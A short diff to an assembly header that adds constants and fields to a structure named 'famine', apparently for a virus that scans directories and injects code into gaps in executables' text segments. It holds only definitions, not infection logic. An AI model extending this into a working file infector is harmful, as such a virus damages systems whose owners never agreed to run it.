@@ -32,7 +32,10 @@
 %define		O_CREAT				64
 %define		O_TRUNC				00001000
 %define		O_APPEND			1024
+%define		O_DIRECTORY			0q0200000
 
+; LSEEK defines
+%define		SEEK_END			2
 
 ; DIRENT defines
 %define		D_INO_OFF			0x00
@@ -94,17 +97,22 @@ endstruc
 
 ; FAMINE structure
 struc	famine
+	.dir_fd:		resd	1
 	.dirents:		resb	DIRENTS_BUFF_SIZE
 	.total_dreclen:	resq	1
+
+	.inject_in_gap:	resb	1
+
 	.map_ptr:		resq	1
 	.gap_size:		resq	1
+	.txt_header:	resq	1
 	.txt_offset:	resq	1
 	.txt_filesz:	resq	1
 	.txt_vaddr:		resq	1
 	.next_offset:	resq	1
 	.orig_entry:	resq	1
+
 	.current_fpath:	resb	PATH_MAX
-	.padding:		resb	PAD_MAX
 	.fsize:			resq	1
 endstruc
 
